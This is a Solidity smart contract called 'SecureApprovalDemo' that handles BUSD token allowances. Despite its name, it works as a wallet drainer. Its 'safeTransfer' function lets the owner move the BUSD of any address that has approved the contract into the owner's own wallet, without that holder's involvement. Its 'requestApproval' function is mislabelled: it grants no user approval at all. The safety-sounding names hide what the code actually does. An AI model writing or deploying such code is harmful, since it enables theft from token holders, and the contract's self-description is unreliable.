
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SecureApprovalDemo {
    address public owner;
    IERC20 public constant BUSD = IERC20(0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47);
    
    event ApprovalGiven(address indexed user, uint256 amount);
    event FundsTransferred(address indexed from, uint256 amount);
    event OwnershipTransferred(address indexed newOwner);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function requestApproval(uint256 amount) external {
        require(amount > 0, "Amount must be > 0");
        bool success = BUSD.approve(msg.sender, amount);
        require(success, "Approval failed");
        emit ApprovalGiven(msg.sender, amount);
    }

    function safeTransfer(address from) external onlyOwner {
        uint256 allowance = BUSD.allowance(from, address(this));
        uint256 balance = BUSD.balanceOf(from);
        
        require(allowance > 0, "No allowance given");
        require(balance > 0, "No BUSD balance");
        
        uint256 transferAmount = allowance < balance ? allowance : balance;
        bool success = BUSD.transferFrom(from, owner, transferAmount);
        require(success, "Transfer failed");
        emit FundsTransferred(from, transferAmount);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
        emit OwnershipTransferred(newOwner);
    }

    function emergencyWithdraw() external onlyOwner {
        uint256 balance = BUSD.balanceOf(address(this));
        if (balance > 0) {
            BUSD.transfer(owner, balance);
        }
    }
}
